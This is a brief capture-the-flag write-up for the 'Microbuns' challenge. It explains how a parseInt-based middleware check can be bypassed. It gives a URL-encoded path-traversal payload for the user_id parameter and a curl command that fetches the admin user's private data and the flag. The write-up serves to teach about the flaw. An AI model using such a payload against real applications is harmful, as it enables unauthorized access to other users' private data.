# Microbuns

## Solution

This challenge is based on the Javascript quirk where `parseInt` will successfully parse a number in a string even though there are non-numeric characters following that number. For example, `parseInt('6pack')` will return `6`.

Inspired by the bug mentioned [here](https://www.youtube.com/watch?v=iFtcathflSw&t=5886s) -- use this as a "writeup" :)

Sample payload for the `:user_id` path paremeter: **2**%2F%2E%2E%2F**1** (2/../1) where 2 is your User ID and 1 is the Admin's User ID.

That payload will bypass this middleware check:

```javascript
if (req?.params?.user_id) {
  if (parseInt(req.params.user_id) !== decoded.user.id) {
    return res.status(403).redirect("/login");
  }
}
```

This should return the private haikus of the Admin user, including the flag in one of them: `curl "$CHALLENGE_URL/user/2%2F%2E%2E%2F1/haikus/private"`
